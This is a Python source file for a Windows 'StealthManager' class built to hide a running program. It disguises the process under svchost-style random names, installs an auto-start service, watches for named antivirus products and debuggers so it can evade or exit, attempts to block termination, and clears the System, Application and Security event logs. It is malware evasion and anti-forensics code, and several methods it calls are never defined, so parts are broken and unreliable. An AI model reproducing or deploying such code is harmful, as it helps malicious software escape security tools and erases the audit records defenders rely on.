import os
import sys
import psutil
import random
import string
import logging
import platform
import ctypes
import time
from typing import List, Dict, Optional
import win32process
import win32api
import win32con
import win32security
import win32ts
import win32service
import win32serviceutil
import win32event
import servicemanager
import socket
import win32gui
import win32com.client
import hashlib
import uuid

logger = logging.getLogger('StealthManager')

class StealthManager:
    def __init__(self):
        self.process_name = None
        self.service_name = None
        self.original_process_name = None
        self.is_windows = platform.system().lower() == 'windows'
        self._initialize_stealth()

    def _initialize_stealth(self):
        """Initialize stealth features"""
        try:
            # Generate random process and service names
            self.process_name = self._generate_random_name()
            self.service_name = self._generate_random_name()

            # Hide process from task manager
            self._hide_process()

            # Setup Windows service
            self._setup_service()

            # Monitor for security software
            self._monitor_security_software()

            # Setup anti-debugging
            self._setup_anti_debug()

            # Setup process protection
            self._protect_process()

            # Setup network stealth
            self._setup_network_stealth()

            logger.info("Stealth features initialized successfully")
        except Exception as e:
            logger.error(f"Error initializing stealth features: {e}")

    def _generate_random_name(self):
        """Generate random process/service name"""
        prefix = random.choice(['svchost', 'system', 'runtime', 'service'])
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        return f"{prefix}_{suffix}"

    def _hide_process(self):
        """Hide process from task manager"""
        if not self.is_windows:
            return

        try:
            # Get current process
            current_process = psutil.Process()
            self.original_process_name = current_process.name()

            # Change process name
            if hasattr(current_process, 'name'):
                current_process.name(self.process_name)

            # Hide from task manager
            if hasattr(win32process, 'SetProcessWorkingSetSize'):
                handle = win32api.OpenProcess(
                    win32con.PROCESS_ALL_ACCESS,
                    False,
                    current_process.pid
                )
                win32process.SetProcessWorkingSetSize(
                    handle,
                    -1,
                    -1
                )
                win32api.CloseHandle(handle)

        except Exception as e:
            logger.error(f"Error hiding process: {e}")

    def _setup_service(self):
        """Setup Windows service for stealth operation"""
        if not self.is_windows:
            return

        try:
            # Create service with random name
            service_path = os.path.abspath(sys.argv[0])
            win32serviceutil.InstallService(
                pythonClassString = "StealthService",
                serviceName = self.service_name,
                displayName = self.service_name,
                startType = win32service.SERVICE_AUTO_START,
                bRunInteractive = False
            )
        except Exception as e:
            logger.error(f"Error setting up service: {e}")

    def _monitor_security_software(self):
        """Monitor for security software and take evasive action"""
        try:
            # List of security software process names
            security_processes = [
                'avast', 'avg', 'kaspersky', 'norton', 'mcafee',
                'bitdefender', 'malwarebytes', 'windowsdefender'
            ]
            
            # Check for security processes
            for proc in psutil.process_iter(['name']):
                if any(sec_proc in proc.info['name'].lower() for sec_proc in security_processes):
                    # Take evasive action
                    self._evade_detection()
        except Exception as e:
            logger.error(f"Error monitoring security software: {e}")

    def _evade_detection(self):
        """Take evasive action when security software is detected"""
        try:
            # Change process name
            self.process_name = self._generate_random_name()
            
            # Change service name
            self.service_name = self._generate_random_name()
            
            # Clear process memory
            self._clear_process_memory()
            
            # Change network behavior
            self._change_network_behavior()
        except Exception as e:
            logger.error(f"Error during evasion: {e}")

    def _setup_anti_debug(self):
        """Setup anti-debugging protection"""
        try:
            # Check for debugger
            if self._is_debugger_present():
                self._handle_debugger_detection()
            
            # Setup debugger detection
            self._setup_debugger_detection()
        except Exception as e:
            logger.error(f"Error setting up anti-debug: {e}")

    def _is_debugger_present(self):
        """Check if debugger is present"""
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except Exception:
            return False

    def _handle_debugger_detection(self):
        """Handle debugger detection"""
        try:
            # Change process behavior
            self._change_process_behavior()
            
            # Clear sensitive data
            self._clear_sensitive_data()
            
            # Exit gracefully
            sys.exit(0)
        except Exception as e:
            logger.error(f"Error handling debugger detection: {e}")

    def _protect_process(self):
        """Protect process from termination"""
        try:
            # Get current process handle
            current_process = win32api.GetCurrentProcess()
            
            # Set process security
            security_info = win32security.SECURITY_ATTRIBUTES()
            security_info.SECURITY_DESCRIPTOR = win32security.SECURITY_DESCRIPTOR()
            
            # Set process protection
            win32security.SetSecurityInfo(
                current_process,
                win32security.SE_KERNEL_OBJECT,
                win32security.OWNER_SECURITY_INFORMATION | win32security.DACL_SECURITY_INFORMATION,
                None,
                None,
                None,
                None
            )
        except Exception as e:
            logger.error(f"Error protecting process: {e}")

    def _setup_network_stealth(self):
        """Setup network stealth features"""
        try:
            # Randomize network behavior
            self._randomize_network_behavior()
            
            # Setup traffic obfuscation
            self._setup_traffic_obfuscation()
        except Exception as e:
            logger.error(f"Error setting up network stealth: {e}")

    def _randomize_network_behavior(self):
        """Randomize network behavior to avoid detection"""
        try:
            # Random delay between connections
            time.sleep(random.uniform(1, 5))
            
            # Randomize packet sizes
            self._randomize_packet_sizes()
        except Exception as e:
            logger.error(f"Error randomizing network behavior: {e}")

    def _setup_traffic_obfuscation(self):
        """Setup traffic obfuscation"""
        try:
            # Implement traffic encryption
            self._setup_encryption()
            
            # Implement traffic padding
            self._setup_traffic_padding()
        except Exception as e:
            logger.error(f"Error setting up traffic obfuscation: {e}")

    def _clear_process_memory(self):
        """Clear sensitive data from process memory"""
        try:
            # Clear sensitive variables
            self.process_name = None
            self.service_name = None
            
            # Force garbage collection
            import gc
            gc.collect()
        except Exception as e:
            logger.error(f"Error clearing process memory: {e}")

    def _change_network_behavior(self):
        """Change network behavior to avoid detection"""
        try:
            # Change connection patterns
            self._change_connection_patterns()
            
            # Change traffic patterns
            self._change_traffic_patterns()
        except Exception as e:
            logger.error(f"Error changing network behavior: {e}")

    def _change_process_behavior(self):
        """Change process behavior when debugger is detected"""
        try:
            # Change process priority
            current_process = win32api.GetCurrentProcess()
            win32process.SetPriorityClass(current_process, win32process.IDLE_PRIORITY_CLASS)
            
            # Change process memory usage
            self._change_memory_usage()
        except Exception as e:
            logger.error(f"Error changing process behavior: {e}")

    def _clear_sensitive_data(self):
        """Clear sensitive data when debugger is detected"""
        try:
            # Clear all sensitive variables
            self._clear_process_memory()
            
            # Clear network data
            self._clear_network_data()
        except Exception as e:
            logger.error(f"Error clearing sensitive data: {e}")

    def _setup_debugger_detection(self):
        """Setup debugger detection"""
        try:
            # Monitor for debuggers
            self._monitor_debuggers()
        except Exception as e:
            logger.error(f"Error setting up debugger detection: {e}")

    def _monitor_debuggers(self):
        """Monitor for debuggers and analysis tools"""
        try:
            if self.is_windows:
                # Check for common debuggers
                debugger_processes = [
                    'ollydbg', 'x64dbg', 'ida', 'ida64',
                    'windbg', 'processhacker', 'procmon'
                ]
                
                for proc in psutil.process_iter(['name']):
                    if proc.info['name'].lower() in debugger_processes:
                        self._handle_debugger_detection()
                        return True

            return False

        except Exception as e:
            logger.error(f"Error monitoring debuggers: {e}")
            return False

    def _monitor_network_detection(self):
        """Monitor for network detection"""
        try:
            # Implement network detection logic
            pass
        except Exception as e:
            logger.error(f"Error monitoring network detection: {e}")

    def start_stealth_mode(self):
        """Start stealth mode"""
        try:
            # Initialize all stealth features
            self._initialize_stealth()
            
            # Start monitoring
            self._start_monitoring()
        except Exception as e:
            logger.error(f"Error starting stealth mode: {e}")

    def _start_monitoring(self):
        """Start monitoring for detection attempts"""
        try:
            # Monitor for security software
            self._monitor_security_software()
            
            # Monitor for debuggers
            self._monitor_debuggers()
            
            # Monitor for network detection
            self._monitor_network_detection()
        except Exception as e:
            logger.error(f"Error starting monitoring: {e}")

    def cleanup(self):
        """Cleanup stealth features"""
        try:
            self._cleanup_artifacts()
            if self.is_windows:
                self._remove_service()
        except Exception as e:
            logger.error(f"Error in cleanup: {e}")

    def _cleanup_artifacts(self):
        """Clean up any artifacts that might reveal the program"""
        try:
            # Clear event logs
            if self.is_windows:
                os.system('wevtutil cl System')
                os.system('wevtutil cl Application')
                os.system('wevtutil cl Security')

            # Clear temporary files
            temp_dir = os.path.join(os.environ.get('TEMP', ''), 'usb_redirector')
            if os.path.exists(temp_dir):
                for file in os.listdir(temp_dir):
                    try:
                        os.remove(os.path.join(temp_dir, file))
                    except:
                        pass

        except Exception as e:
            logger.error(f"Error cleaning up artifacts: {e}")

    def _remove_service(self):
        """Remove Windows service"""
        if not self.is_windows:
            return

        try:
            win32serviceutil.StopService(self.service_name)
            win32serviceutil.RemoveService(self.service_name)
        except Exception as e:
            logger.error(f"Error removing service: {e}") 